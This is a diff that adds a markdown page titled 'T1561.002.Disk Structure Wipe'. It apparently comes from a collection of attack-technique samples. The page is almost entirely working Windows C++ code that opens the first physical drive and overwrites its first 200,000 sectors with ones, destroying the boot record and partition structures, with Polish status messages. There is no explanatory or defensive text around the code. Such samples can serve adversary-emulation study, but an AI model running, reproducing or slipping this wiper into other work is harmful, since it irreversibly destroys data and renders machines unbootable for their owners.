@@ -1,0 +1,49 @@
+---
+title: "T1561.002.Disk Structure Wipe "
+folder: "14. Impact"
+---
+
+
+
+
+
+#include <iostream>
+#include <Windows.h>
+#include <fstream>
+
+
+using namespace std;
+std::ofstream dest("wynik.txt", std::ios::binary);
+void replaceWithOnes(HANDLE hDisk, DWORD sectorNumber) {
+    char buffer[512];
+    memset(buffer, 1, sizeof(buffer));
+
+    DWORD bytesWritten;
+    LARGE_INTEGER li;
+    li.QuadPart = sectorNumber * 512;
+
+    SetFilePointerEx(hDisk, li, NULL, FILE_BEGIN);
+
+    WriteFile(hDisk, buffer, sizeof(buffer), &bytesWritten, NULL);
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    const wchar_t* diskPath = L"\\\\.\\PhysicalDrive0";
+    HANDLE hDisk = CreateFileW(diskPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+
+    if (hDisk == INVALID_HANDLE_VALUE) {
+        cout << "Nie można otworzyć dysku." << endl;
+        return 1;
+    }
+
+    DWORD numSectors = 200000; 
+    for (DWORD i = 0; i < numSectors; ++i) {
+        replaceWithOnes(hDisk, i);
+    }
+
+    CloseHandle(hDisk);
+    dest << "Zawartość sektorów na dysku została zastąpiona jedynkami." << endl;
+
+    return 0;
+}
